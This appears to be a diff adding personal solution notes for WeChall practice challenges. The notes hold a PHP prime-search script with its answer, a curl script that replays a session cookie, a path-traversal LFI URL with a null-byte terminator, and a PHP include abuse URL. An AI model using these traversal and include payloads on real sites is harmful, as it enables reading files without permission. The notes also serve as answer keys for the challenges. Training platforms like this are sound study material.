@@ -1,0 +1,61 @@
+https://www.wechall.net/es/challs
+
+Prime factory
+	<?php
+		$start = 1000000;
+		$end =   2000000;
+		$primo1=$primo2=0;
+		for($i = $start; $i <= $end; $i++){
+			if(is_prime($i)){
+				$primo2=$primo1;
+				$primo1=$i;
+				if(is_prime($primo1) && is_prime($primo2)){
+					if(is_prime(array_sum(array_map('intval', str_split($primo1)))) && is_prime(array_sum(array_map('intval', str_split($primo2))))){
+							echo "P1: $primo1, P2: $primo2, Resultado: $primo2$primo1";
+							die;
+					}
+				}
+			}
+		}
+		function is_prime($number){
+			// 1 is not prime
+			if ( $number == 1 ) {
+				return false;
+			}
+			// 2 is the only even prime number
+			if ( $number == 2 ) {
+				return true;
+			}
+			// square root algorithm speeds up testing of bigger prime numbers
+			$x = sqrt($number);
+			$x = floor($x);
+			for ( $i = 2 ; $i <= $x ; ++$i ) {
+				if ( $number % $i == 0 ) {
+					break;
+				}
+			}
+		 
+			if( $x == $i-1 ) {
+				return true;
+			} else {
+				return false;
+			}
+		}
+		
+		P1: 1000037, P2: 1000033, Resultado: 10000331000037
+
+Training: Programming 1
+	$curl = curl_init('https://www.wechall.net/es/challenge/training/programming1/index.php?action=request');
+	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($curl, CURLOPT_HTTPHEADER, array('Cookie: WC=12761337-49951-sGzv4TGcc3mME8gL'));
+	$data = curl_exec($curl);
+	$curl = curl_init('https://www.wechall.net/es/challenge/training/programming1/index.php?answer='.$data);
+	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($curl, CURLOPT_HTTPHEADER, array('Cookie: WC=12761337-49951-sGzv4TGcc3mME8gL'));
+	$data = curl_exec($curl);
+	echo $data;
+
+Training: PHP LFI
+	https://www.wechall.net/es/challenge/training/php/lfi/up/index.php?file=../../solution.php%00
+PHP 1817
+	https://www.wechall.net/es/challenge/php0817/index.php?which=solution wtf
